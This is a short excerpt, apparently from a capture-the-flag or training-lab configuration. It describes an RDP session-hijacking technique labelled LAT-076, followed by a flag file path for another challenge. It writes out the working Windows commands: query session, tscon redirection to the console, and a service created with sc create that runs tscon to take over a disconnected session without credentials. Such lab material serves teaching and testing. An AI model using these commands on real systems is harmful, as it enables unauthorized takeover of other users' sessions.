        LAT-076: RDP Session Hijacking (tscon without password)
        =========================================================
        From SYSTEM context, take over disconnected RDP sessions without credentials:

          query session                        # list sessions
          tscon $(session_id) /dest:console   # hijack session

        Or via service:
          sc create hijack binpath="cmd /k tscon 2 /dest:rdp-tcp#0"
          net start hijack

    - path: 'C:\Flags\FLAG-LAT-080-SCMExec.txt'
